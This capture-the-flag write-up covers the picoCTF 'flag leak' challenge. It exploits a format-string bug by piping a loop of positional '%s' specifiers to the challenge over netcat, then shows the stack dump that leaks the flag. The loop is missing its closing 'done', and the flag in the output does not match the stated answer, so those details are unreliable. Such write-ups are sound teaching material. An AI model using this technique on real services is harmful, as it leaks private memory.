## flag leak

The challenge prompt is as follows:
```
Story telling class 1/2
Additional details will be available after launching your challenge instance.

debug info: [u:697741 e: p: c:269 i:295282]

This challenge launches an instance on demand.
```

The challenge instance is launched using:
```
nc saturn.picoctf.net 63889
```

This returns:
```
Tell me a story and then I'll tell you one >> heyyyyyyyyyyyyyyy
Here's a story -
heyyyyyyyyyyyyyyy
```

So it returns whatever is put as input.

String vulnerabilities need to be exploited to leak the flag successfully.

The following command is used:
```
for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 63889
```

This command loops from 0 to 999 for variable i, constructs a string format specifier ```%$i\$s``` :
* ```$i``` selects the argument i on the stack
* ```%s``` treats the argument as a string pointer and attempts to read it as a null-terminated string.

The remaining command pipes the output of the echo loop to the nc challenge instance.

The output is a long list which includes the flag:
```
Tell me a story and then I'll tell you one >> Here's a story -
%0$s
Tell me a story and then I'll tell you one >> Here's a story -
%1$s
Tell me a story and then I'll tell you one >> Here's a story -
story
Tell me a story and then I'll tell you one >> Here's a story -
ú,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
/
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
.
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
storyTell me a story and then I'll tell you one >> Here's a story -
(gm
gm
gm
gm
gm
gm
gm
hm

Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -
qY
Tell me a story and then I'll tell you one >> Here's a story -
e
Tell me a story and then I'll tell you one >> Here's a story -
setresgid
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
Tell me a story and then I'll tell you one >> Here's a story -
Je
Tell me a story and then I'll tell you one >> Here's a story -
̓ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
̓ii
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
$
Tell me a story and then I'll tell you one >> Here's a story -

Tell me a story and then I'll tell you one >> Here's a story -
(gm%gm%gm%gm%gm%gm%gm%hm%
Tell me a story and then I'll tell you one >> Here's a story -
story��
```

* Thus the flag is:
```
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
